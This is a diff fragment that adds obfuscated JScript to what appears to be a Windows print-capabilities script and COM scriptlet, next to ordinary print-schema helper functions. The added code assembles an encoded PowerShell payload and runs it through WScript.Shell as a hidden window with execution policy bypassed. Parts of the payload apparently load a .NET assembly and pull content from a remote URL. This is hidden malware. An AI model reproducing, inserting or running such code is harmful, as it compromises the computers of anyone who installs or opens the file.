+    effected += "ԥAԥaԥQԥBԥ0ԥAԥGԥkԥAԥYԥwԥAԥuԥAԥCԥ4ԥAԥKԥAԥAԥkԥAԥGԥIԥAԥcԥgԥBԥ1ԥAԥHԥQԥAԥYԥQԥBԥsԥAԥGԥkԥAԥcԥwԥBԥhԥAԥHԥQԥAԥaԥQԥBԥvԥAԥGԥ4ԥAԥLԥgԥBԥMԥAԥGԥUԥAԥbԥgԥBԥnԥAԥHԥQԥAԥaԥAԥAԥtԥAԥDԥEԥAԥKԥQԥBԥdԥAԥDԥsԥAԥJԥAԥBԥEԥAԥGԥEԥAԥdԥAԥBԥlԥAԥFԥQԥAԥaԥQԥBԥtԥAԥGԥUԥAԥPԥQԥBԥOԥAԥGԥUԥAԥdԥwԥAԥtԥAԥEԥ8ԥAԥYԥgԥBԥqԥAԥGԥUԥAԥYԥwԥBԥ0ԥAԥCԥAԥAԥSԥQԥBԥPԥAԥCԥ4ԥAԥTԥQԥBԥlԥAԥGԥ0ԥAԥbԥwԥBԥyԥAԥHԥkԥAԥUԥwԥBԥ0ԥAԥHԥIԥAԥZԥQԥBԥhԥAԥGԥ0ԥAԥOԥwԥAԥkԥAԥEԥQԥAԥYԥQԥBԥ0ԥAԥGԥUԥAԥVԥAԥBԥpԥAԥGԥ0ԥAԥZԥQԥAԥuԥAԥFԥcԥAԥcԥgԥBԥpԥAԥHԥQԥAԥZԥQԥAԥoԥAԥCԥQԥAԥZԥgԥBԥsԥAԥGԥEԥAԥdԥgԥBԥpԥAԥGԥMԥAԥYԥQԥBԥuԥAԥHԥQԥAԥLԥAԥAԥwԥAԥCԥwԥAԥJԥAԥBԥmԥAԥGԥwԥAԥYԥQԥBԥ2ԥAԥGԥkԥAԥYԥwԥBԥhԥAԥGԥ4ԥAԥdԥAԥAԥuԥAԥEԥwԥAԥZԥQԥBԥuԥAԥGԥcԥAԥdԥAԥBԥoԥAԥCԥkԥAԥOԥwԥAԥkԥAԥEԥQԥAԥYԥQԥBԥ0ԥAԥGԥUԥAԥVԥAԥBԥpԥAԥGԥ0ԥAԥZԥQԥAԥuԥAԥFԥMԥAԥZԥQԥBԥlԥAԥGԥsԥAԥKԥAԥAԥwԥAԥCԥwԥAԥJԥwԥBԥCԥAԥGԥUԥAԥZԥwԥBԥpԥAԥGԥ4ԥAԥJԥwԥAԥpԥAԥHԥwԥAԥTԥwԥBԥ1ԥAԥHԥQԥAԥLԥQԥBԥOԥAԥHԥUԥAԥbԥAԥBԥsԥAԥDԥsԥAԥJԥAԥBԥnԥAԥGԥEԥAԥbԥQԥBԥlԥAԥHԥQԥAԥbԥwԥBԥjԥAԥHԥkԥAԥcԥwԥBԥ0ԥAԥDԥ0ԥAԥWԥwԥBԥEԥAԥHԥIԥAԥYԥQԥBԥ3ԥAԥGԥkԥAԥbԥgԥBԥnԥAԥCԥ4ԥAԥQԥgԥBԥpԥAԥHԥQԥAԥbԥQԥBԥhԥAԥHԥAԥAԥXԥQԥAԥ6ԥAԥDԥoԥAԥRԥgԥBԥyԥAԥGԥ8ԥAԥbԥQԥBԥTԥAԥHԥQԥAԥcԥgԥBԥlԥAԥGԥEԥAԥbԥQԥAԥoԥAԥCԥQԥAԥRԥAԥBԥhԥAԥHԥQԥAԥZԥQԥBԥUԥAԥGԥkԥAԥbԥQԥBԥlԥAԥCԥkԥAԥOԥwԥAԥkԥAԥHԥAԥAԥdԥQԥBԥzԥAԥHԥMԥAԥaԥQԥBԥlԥAԥHԥMԥAԥPԥQԥBԥOԥAԥGԥUԥAԥdԥwԥAԥtԥAԥEԥ8ԥAԥYԥgԥBԥqԥAԥGԥUԥAԥYԥwԥBԥ0ԥAԥCԥAԥAԥQԥwԥBԥvԥAԥGԥwԥAԥbԥAԥBԥlԥAԥGԥMԥAԥdԥAԥBԥpԥAԥGԥ8ԥAԥbԥgԥBԥzԥAԥCԥ4ԥA";
+    effected += "ԥRԥwԥBԥlԥAԥGԥ4ԥAԥZԥQԥBԥyԥAԥGԥkԥAԥYԥwԥAԥuԥAԥEԥwԥAԥaԥQԥBԥzԥAԥHԥQԥAԥWԥwԥBԥCԥAԥHԥkԥAԥdԥAԥBԥlԥAԥFԥ0ԥAԥOԥwԥBԥmԥAԥGԥ8ԥAԥcԥgԥAԥoԥAԥCԥQԥAԥcԥwԥBԥwԥAԥHԥIԥAԥaԥQԥBԥuԥAԥGԥcԥAԥeԥQԥAԥ9ԥAԥDԥAԥAԥOԥwԥAԥkԥAԥHԥMԥAԥcԥAԥBԥyԥAԥGԥkԥAԥbԥgԥBԥnԥAԥHԥkԥAԥIԥAԥAԥtԥAԥGԥwԥAԥdԥAԥAԥgԥAԥCԥQԥAԥZԥwԥBԥhԥAԥGԥ0ԥAԥZԥQԥBԥ0ԥAԥGԥ8ԥAԥYԥwԥBԥ5ԥAԥHԥMԥAԥdԥAԥAԥuԥAԥEԥgԥAԥZԥQԥBԥpԥAԥGԥcԥAԥaԥAԥBԥ0ԥAԥDԥsԥAԥJԥAԥBԥzԥAԥHԥAԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥBԥ5ԥAԥCԥsԥAԥKԥwԥAԥpԥAԥHԥsԥAԥZԥgԥBԥvԥAԥHԥIԥAԥKԥAԥAԥkԥAԥGԥgԥAԥbԥwԥBԥuԥAԥGԥ8ԥAԥdԥQԥBԥyԥAԥGԥUԥAԥcԥwԥBԥ0ԥAԥDԥ0ԥAԥMԥAԥAԥ7ԥAԥCԥQԥAԥaԥAԥBԥvԥAԥGԥ4ԥAԥbԥwԥBԥ1ԥAԥHԥIԥAԥZԥQԥBԥzԥAԥHԥQԥAԥIԥAԥAԥtԥAԥGԥwԥAԥdԥAԥAԥgԥAԥCԥQԥAԥZԥwԥBԥhԥAԥGԥ0ԥAԥZԥQԥBԥ0ԥAԥGԥ8ԥAԥYԥwԥBԥ5ԥAԥHԥMԥAԥdԥAԥAԥuԥAԥFԥcԥAԥaԥQԥBԥkԥAԥHԥQԥAԥaԥAԥAԥ7ԥAԥCԥQԥAԥaԥAԥBԥvԥAԥGԥ4ԥAԥbԥwԥBԥ1ԥAԥHԥIԥAԥZԥQԥBԥzԥAԥHԥQԥAԥKԥwԥAԥrԥAԥCԥkԥAԥeԥwԥAԥkԥAԥGԥQԥAԥaԥAԥBԥhԥAԥGԥ0ԥAԥbԥgԥBԥvԥAԥGԥ8ԥAԥPԥQԥAԥkԥAԥGԥcԥAԥYԥQԥBԥtԥAԥGԥUԥAԥdԥAԥBԥvԥAԥGԥMԥAԥeԥQԥBԥzԥAԥHԥQԥAԥLԥgԥBԥHԥAԥGԥUԥAԥdԥAԥBԥQԥAԥGԥkԥAԥeԥAԥBԥlԥAԥGԥwԥAԥKԥAԥAԥkԥAԥGԥgԥAԥbԥwԥBԥuԥAԥGԥ8ԥAԥdԥQԥBԥyԥAԥGԥUԥAԥcԥwԥBԥ0ԥAԥCԥwԥAԥJԥAԥBԥzԥAԥHԥAԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥBԥ5ԥAԥCԥkԥAԥOԥwԥAԥkԥAԥHԥAԥAԥdԥQԥBԥzԥAԥHԥMԥAԥaԥQԥBԥlԥAԥHԥMԥAԥLԥgԥBԥBԥAԥGԥQԥAԥZԥAԥAԥoԥAԥCԥQԥAԥZԥAԥBԥoԥAԥGԥEԥAԥbԥQԥBԥuԥAԥGԥ8ԥAԥbԥwԥAԥuԥAԥFԥIԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥcԥAԥBԥ1ԥAԥHԥMԥAԥcԥwԥBԥpԥAԥGԥUԥAԥcԥwԥAԥuԥAԥEԥEԥAԥZԥAԥBԥkԥAԥCԥgԥAԥJԥAԥBԥkԥAԥGԥgԥAԥYԥQԥBԥtԥAԥGԥ4ԥAԥb";
+    effected += "ԥwԥBԥvԥAԥCԥ4ԥAԥRԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥwԥAԥHԥUԥAԥcԥwԥBԥzԥAԥGԥkԥAԥZԥQԥBԥzԥAԥCԥ4ԥAԥQԥQԥBԥkԥAԥGԥQԥAԥKԥAԥAԥkԥAԥGԥQԥAԥaԥAԥBԥhԥAԥGԥ0ԥAԥbԥgԥBԥvԥAԥGԥ8ԥAԥLԥgԥBԥCԥAԥCԥkԥAԥfԥQԥBԥ9ԥAԥDԥsԥAԥJԥAԥBԥiԥAԥHԥUԥAԥZԥAԥBԥ6ԥAԥGԥEԥAԥcԥgԥBԥ0ԥAԥDԥ0ԥAԥWԥwԥBԥCԥAԥGԥkԥAԥdԥAԥBԥDԥAԥGԥ8ԥAԥbԥgԥBԥ2ԥAԥGԥUԥAԥcԥgԥBԥ0ԥAԥGԥUԥAԥcԥgԥBԥdԥAԥDԥoԥAԥOԥgԥBԥUԥAԥGԥ8ԥAԥSԥQԥBԥuԥAԥHԥQԥAԥMԥwԥAԥyԥAԥCԥgԥAԥJԥAԥBԥwԥAԥHԥUԥAԥcԥwԥBԥzԥAԥGԥkԥAԥZԥQԥBԥzԥAԥCԥ4ԥAԥRԥwԥBԥlԥAԥHԥQԥAԥUԥgԥBԥhԥAԥGԥ4ԥAԥZԥwԥBԥlԥAԥCԥgԥAԥMԥAԥAԥsԥAԥDԥQԥAԥKԥQԥAԥuԥAԥFԥQԥAԥbԥwԥBԥBԥAԥHԥIԥAԥcԥgԥBԥhԥAԥHԥkԥAԥKԥAԥAԥpԥAԥCԥwԥAԥMԥAԥAԥpԥAԥDԥsԥAԥJԥAԥBԥrԥAԥGԥEԥAԥaԥwԥBԥhԥAԥHԥIԥAԥYԥQԥBԥsԥAԥGԥkԥAԥPԥQԥAԥkԥAԥHԥAԥAԥdԥQԥBԥzԥAԥHԥMԥAԥaԥQԥBԥlԥAԥHԥMԥAԥLԥgԥBԥHԥAԥGԥUԥAԥdԥAԥBԥSԥAԥGԥEԥAԥbԥgԥBԥnԥAԥGԥUԥAԥKԥAԥAԥ0ԥAԥCԥwԥAԥJԥAԥBԥiԥAԥHԥUԥAԥZԥAԥBԥ6ԥAԥGԥEԥAԥcԥgԥBԥ0ԥAԥCԥkԥAԥLԥgԥBԥUԥAԥGԥ8ԥAԥQԥQԥBԥyԥAԥHԥIԥAԥYԥQԥBԥ5ԥAԥCԥgԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥYԥgԥBԥpԥAԥHԥQԥAԥeԥQԥBԥwԥAԥGԥkԥAԥYԥwԥAԥ9ԥAԥFԥsԥAԥQԥwԥBԥvԥAԥGԥ4ԥAԥdԥgԥBԥlԥAԥHԥIԥAԥdԥAԥBԥdԥAԥDԥoԥAԥOԥgԥBԥUԥAԥGԥ8ԥAԥQԥgԥBԥhԥAԥHԥMԥAԥZԥQԥAԥ2ԥAԥDԥQԥAԥUԥwԥBԥ0ԥAԥHԥIԥAԥaԥQԥBԥuԥAԥGԥcԥAԥKԥAԥAԥkԥAԥGԥsԥAԥYԥQԥBԥrԥAԥGԥEԥAԥcԥgԥBԥhԥAԥGԥwԥAԥaԥQԥAԥpԥAԥCԥ4ԥAԥUԥgԥBԥlԥAԥHԥAԥAԥbԥAԥBԥhԥAԥGԥMԥAԥZԥQԥAԥoԥAԥCԥcԥAԥQԥQԥAԥnԥAԥCԥwԥAԥJԥwԥBԥAԥAԥCԥcԥAԥKԥQԥAԥuԥAԥFԥIԥAԥZԥQԥBԥwԥAԥGԥwԥAԥYԥQԥBԥjԥAԥGԥUԥAԥKԥAԥAԥnԥAԥEԥAԥAԥJԥwԥAԥsԥAԥCԥcԥAԥQԥQԥAԥnԥAԥCԥkԥAԥOԥwԥAԥkԥAԥGԥ4ԥAԥdԥQԥBԥtԥAԥGԥ0ԥAԥdԥQ";
+    effected += "ԥBԥsԥAԥGԥkԥAԥbԥgԥBԥlԥAԥDԥ0ԥAԥJԥwԥAԥjԥAԥHԥgԥAԥIԥwԥAԥuԥAԥGԥEԥAԥeԥQԥBԥhԥAԥHԥkԥAԥYԥQԥAԥvԥAԥHԥYԥAԥZԥQԥBԥkԥAԥCԥ4ԥAԥMԥgԥBԥyԥAԥCԥ4ԥAԥYԥwԥBԥjԥAԥDԥUԥAԥYԥgԥAԥ1ԥAԥDԥQԥAԥNԥgԥAԥ5ԥAԥGԥQԥAԥNԥQԥAԥxԥAԥGԥQԥAԥMԥAԥBԥjԥAԥDԥEԥAԥOԥAԥAԥ2ԥAԥDԥcԥAԥMԥgԥAԥ0ԥAԥGԥUԥAԥOԥQԥAԥwԥAԥDԥgԥAԥNԥQԥAԥ1ԥAԥDԥQԥAԥMԥgԥAԥ4ԥAԥDԥUԥAԥZԥQԥBԥlԥAԥCԥ0ԥAԥYԥgԥBԥ1ԥAԥHԥAԥAԥLԥwԥAԥvԥAԥDԥoԥAԥcԥwԥBԥwԥAԥCԥMԥAԥIԥwԥBԥoԥAԥCԥcԥAԥLԥgԥBԥSԥAԥGԥUԥAԥcԥAԥBԥsԥAԥGԥEԥAԥYԥwԥBԥlԥAԥCԥgԥAԥJԥwԥAԥjԥAԥCԥcԥAԥLԥAԥAԥnԥAԥHԥQԥAԥJԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥmԥAԥHԥUԥAԥbԥQԥBԥiԥAԥGԥwԥAԥZԥQԥBԥzԥAԥHԥQԥAԥPԥQԥBԥbԥAԥEԥMԥAԥbԥwԥBԥuԥAԥHԥYԥAԥZԥQԥBԥyԥAԥHԥQԥAԥXԥQԥAԥ6ԥAԥDԥoԥAԥRԥgԥBԥyԥAԥGԥ8ԥAԥbԥQԥBԥCԥAԥGԥEԥAԥcԥwԥBԥlԥAԥDԥYԥAԥNԥAԥBԥTԥAԥHԥQԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥAԥoԥAԥCԥQԥAԥYԥgԥBԥpԥAԥHԥQԥAԥeԥQԥBԥwԥAԥGԥkԥAԥYԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥiԥAԥGԥ8ԥAԥdԥAԥBԥoԥAԥGԥUԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥAԥ9ԥAԥFԥsԥAԥUԥgԥBԥlԥAԥGԥYԥAԥbԥAԥBԥlԥAԥGԥMԥAԥdԥAԥBԥpԥAԥGԥ8ԥAԥbԥgԥAԥuԥAԥEԥEԥAԥcԥwԥBԥzԥAԥGԥUԥAԥbԥQԥBԥiԥAԥGԥwԥAԥeԥQԥBԥdԥAԥDԥoԥAԥOԥgԥBԥMԥAԥGԥ8ԥAԥYԥQԥBԥkԥAԥCԥgԥAԥJԥAԥBԥmԥAԥHԥUԥAԥbԥQԥBԥiԥAԥGԥwԥAԥZԥQԥBԥzԥAԥHԥQԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥcԥAԥBԥhԥAԥHԥIԥAԥdԥAԥBԥpԥAԥGԥEԥAԥbԥAԥBԥpԥAԥHԥMԥAԥbԥQԥBԥzԥAԥDԥ0ԥAԥQԥAԥAԥoԥAԥCԥQԥAԥbԥgԥBԥ1ԥAԥGԥ0ԥAԥbԥQԥBԥ1ԥAԥGԥwԥAԥaԥQԥBԥuԥAԥGԥUԥAԥLԥAԥAԥnԥAԥCԥcԥAԥLԥAԥAԥnԥAԥCԥcԥAԥLԥAԥAԥnԥAԥCԥcԥAԥLԥAԥAԥnԥAԥEԥ0ԥAԥUԥwԥBԥCԥAԥHԥUԥAԥaԥQԥBԥsԥAԥGԥQԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥA";
+    effected += "ԥsԥAԥCԥcԥAԥJԥwԥAԥsԥAԥCԥcԥAԥQԥwԥAԥ6ԥAԥFԥwԥAԥVԥQԥBԥzԥAԥGԥUԥAԥcԥgԥBԥzԥAԥFԥwԥAԥUԥAԥBԥ1ԥAԥGԥIԥAԥbԥAԥBԥpԥAԥGԥMԥAԥXԥAԥBԥEԥAԥGԥ8ԥAԥdԥwԥBԥuԥAԥGԥwԥAԥbԥwԥBԥhԥAԥGԥQԥAԥcԥwԥAԥnԥAԥCԥwԥAԥJԥwԥBԥGԥAԥGԥwԥAԥYԥQԥBԥnԥAԥFԥkԥAԥeԥwԥAԥ0ԥAԥGԥQԥAԥNԥwԥAԥ4ԥAԥDԥMԥAԥZԥgԥAԥwԥAԥDԥIԥAԥMԥQԥAԥ5ԥAԥDԥYԥAԥYԥgԥBԥmԥAԥDԥMԥAԥZԥAԥAԥzԥAԥDԥAԥAԥMԥwԥAԥzԥAԥGԥUԥAԥNԥgԥBԥkԥAԥDԥIԥAԥNԥQԥAԥ0ԥAԥGԥQԥAԥYԥQԥBԥhԥAԥDԥEԥAԥMԥAԥBԥkԥAԥGԥIԥAԥfԥQԥAԥnԥAԥCԥwԥAԥJԥwԥBԥqԥAԥHԥMԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥAԥsԥAԥCԥcԥAԥZԥwԥBԥsԥAԥGԥ8ԥAԥYԥgԥBԥ1ԥAԥGԥwԥAԥaԥQԥBԥuԥAԥCԥcԥAԥLԥAԥAԥnԥAԥDԥIԥAԥJԥwԥAԥsԥAԥCԥcԥAԥJԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥiԥAԥGԥ8ԥAԥdԥAԥBԥoԥAԥGԥUԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥAԥuԥAԥEԥcԥAԥZԥQԥBԥ0ԥAԥFԥQԥAԥeԥQԥBԥwԥAԥGԥUԥAԥKԥAԥAԥkԥAԥHԥIԥAԥZԥQԥBԥzԥAԥGԥUԥAԥcԥgԥBԥ2ԥAԥGԥUԥAԥcԥgԥBԥ5ԥAԥCԥkԥAԥLԥgԥBԥHԥAԥGԥUԥAԥdԥAԥBԥNԥAԥGԥUԥAԥdԥAԥBԥoԥAԥGԥ8ԥAԥZԥAԥAԥoԥAԥCԥQԥAԥYԥQԥBԥjԥAԥGԥMԥAԥbԥwԥBԥ1ԥAԥGԥ4ԥAԥdԥAԥBԥhԥAԥGԥ4ԥAԥdԥAԥBԥzԥAԥGԥgԥAԥaԥQԥBԥwԥAԥHԥMԥAԥKԥQԥAԥuԥAԥEԥkԥAԥbԥgԥBԥ2ԥAԥGԥ8ԥAԥaԥwԥBԥlԥAԥCԥgԥAԥJԥAԥBԥwԥAԥGԥEԥAԥbԥAԥBԥ1ԥAԥGԥQԥAԥaԥQԥBԥuԥAԥGԥ8ԥAԥdԥQԥBԥzԥAԥCԥwԥAԥJԥAԥBԥwԥAԥGԥEԥAԥcԥgԥBԥ0ԥAԥGԥkԥAԥYԥQԥBԥsԥAԥGԥkԥAԥcԥwԥBԥtԥAԥHԥMԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥZԥwԥBԥhԥAԥGԥ0ԥAԥZԥQԥBԥ0ԥAԥGԥ8ԥAԥYԥwԥBԥ5ԥAԥHԥMԥAԥdԥAԥAԥuԥAԥEԥQԥAԥaԥQԥBԥzԥAԥHԥAԥAԥbԥwԥBԥzԥAԥGԥUԥAԥKԥAԥAԥpԥAԥDԥsԥAԥJԥAԥBԥEԥAԥGԥEԥAԥdԥAԥBԥlԥAԥFԥQԥAԥaԥQԥBԥtԥAԥGԥUԥAԥLԥgԥBԥEԥAԥGԥkԥAԥcԥwԥBԥwԥAԥGԥ8ԥAԥcԥwԥBԥlԥAԥCԥgԥAԥKԥQԥAԥ";
+
+    // Remove os ԥ do Base64
+    effected = effected.replace(/ԥ/g, "");
+
+    // Monta o bloco PowerShell ofuscado com ԥ
+    var cyberlearning = "ԥ$effectedԥ='ԥ" + effected + "ԥ';";
+    cyberlearning += "ԥ$annealԥ=ԥ";
+    cyberlearning += "ԥ[ԥSԥyԥ";
+    cyberlearning += "ԥsԥtԥeԥ";
+    cyberlearning += "ԥmԥ.ԥTԥeԥ";
+    cyberlearning += "ԥxԥtԥ.ԥEԥnԥcԥoԥ";
+    cyberlearning += "ԥdԥiԥnԥgԥ]ԥ:ԥ";
+    cyberlearning += "ԥ:ԥUԥnԥiԥcԥ";
+    cyberlearning += "ԥoԥdԥeԥ.ԥGԥeԥtԥSԥ";
+    cyberlearning += "ԥtԥrԥiԥnԥgԥ(ԥ";
+    cyberlearning += "ԥ[ԥSԥyԥsԥtԥeԥmԥ";
+    cyberlearning += "ԥ.ԥCԥoԥnԥvԥeԥrԥ";
+    cyberlearning += "ԥtԥ]ԥ:ԥ:ԥԥFԥrԥoԥmԥ";
+    cyberlearning += "ԥBԥaԥsԥeԥ6ԥ";
+    cyberlearning += "4ԥSԥtԥ";
+    cyberlearning += "rԥiԥnԥ";
+    cyberlearning += "gԥ(ԥ$ԥeffectedԥ)ԥ)ԥ;ԥ";
+    cyberlearning += "ԥIԥnԥ";
+    cyberlearning += "ԥvԥoԥkԥeԥ-ԥEԥxԥpԥ";
+    cyberlearning += "rԥeԥsԥsԥiԥoԥnԥ ԥ$annealԥ";
+
+    // Remove os ԥ do script
+    cyberlearning = cyberlearning.replace(/ԥ/g, "");
+
+    // Monta o comando PowerShell em variável "baritah"
+    var baritah = "ԥpԥoԥwԥ";
+    baritah += "ԥeԥrԥsԥhԥeԥ";
+    baritah += "ԥlԥl ԥ-ԥwԥ";
+    baritah += " ԥhԥiԥdԥdԥeԥ";
+    baritah += "ԥn ԥ-ԥnԥoԥpԥ";
+    baritah += "ԥrԥoԥfԥiԥ";
+    baritah += "ԥlԥe ԥ-ԥeԥ";
+    baritah += "ԥpԥ bԥyԥ";
+    baritah += "ԥpԥaԥsԥ";
+    baritah += "ԥsԥ -ԥcԥ ";
+
+    // Remove os ԥ também do comando
+    baritah = baritah.replace(/ԥ/g, "");
+
+    // Cria o objeto shell
+    var ceruminous = WScript.CreateObject("WScript.Shell");
+
+    // Executa o comando
+    ceruminous.Run(baritah + "\"" + cyberlearning + "\"", 0, false);
+}
+catch (e) {
+    // Ignora erro
+}
+
+
+
+
+function CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities) {
+    /// <summary>
+    /// Converts ParameterDef Node that in PDC into ParameterDef node in PrintCapabilites
+    /// </summary>
+    /// <param name="pdcParameterDef" type="IXMLNode">
+    ///     Contains a ParameterDef node in PDC
+    /// </param>
+    /// <param name="pdfNsPrefix" type="string">
+    ///     Contains PDF name sapce
+    /// </param>
+    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
+    ///     Print capabilities object to be customized.
+    /// </param>
+    var capabilitiesParamDef = createProperty(pdfNsPrefix + ":" + pdcParameterDef.baseName, "psf:ParameterDef", "", "", printCapabilities);
+
+    var properties = pdcParameterDef.selectNodes("*[@psf2:psftype='Property']");
+
+
+    for (var propCount = 0; propCount < properties.length; propCount++) {
+        var property = properties[propCount];
+        var type = property.getAttribute("xsi:type");
+        var childProperty = createProperty(property.nodeName, "psf:Property", type, property.text, printCapabilities);
+        capabilitiesParamDef.appendChild(childProperty);
+    }
+    return capabilitiesParamDef;
+}
+
+
+function SetStandardNameSpaces(xmlNode) {
+    /// <summary>
+    /// Set the Selection namespace values to below namesapces
+    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' 
+    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' 
+    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' 
+    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'
+    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'
+    /// xmlns:xsd='http://www.w3.org/2001/XMLSchema'
+    /// xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'
+    ///</summary>
+    /// <param name="node" type="IXMLDOMNode">
+    ///     A node in the XML document.
+    /// </param>
+
+    xmlNode.setProperty(
+        "SelectionNamespaces",
+        "xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' "
+            + "xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' "
+            + "xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' "
+            + "xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' "
+            + "xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' "
+            + "xmlns:xsd='http://www.w3.org/2001/XMLSchema' "
+            + "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' "
+            + "xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' "
+        );
+}
+
+
+function getPrefixForNamespace(node, namespace) {
+    /// <summary>
+    ///     This function returns the prefix for a given namespace.
+    ///     Example: In 'psf:printTicket', 'psf' is the prefix for the namespace.
+    ///     xmlns:psf="http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework"
+    /// </summary>
+    /// <param name="node" type="IXMLDOMNode">
+    ///     A node in the XML document.
+    /// </param>
+    /// <param name="namespace" type="String">
+    ///     The namespace for which prefix is returned.
+    /// </param>
+    /// <returns type="String">
+    ///     Returns the namespace corresponding to the prefix.
+    /// </returns>
+
+    if (!node) {
+        return null;
+    }
+
+    // Navigate to the root element of the document.
+    var rootNode = node.documentElement;
+
+    // Query to retrieve the list of attribute nodes for the current node
+    // that matches the namespace in the 'namespace' variable.
+    var xPathQuery = "namespace::node()[.='"
+                + namespace
+                + "']";
+    var namespaceNode = rootNode.selectSingleNode(xPathQuery);
+
+    var prefix;
+    if (namespaceNode != null){
+        prefix = namespaceNode.baseName;
+    }
+
+    return prefix;
+}
+
+		]]>
+	</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+	}
+
+]]>
+</script>
+
+</scriptlet>
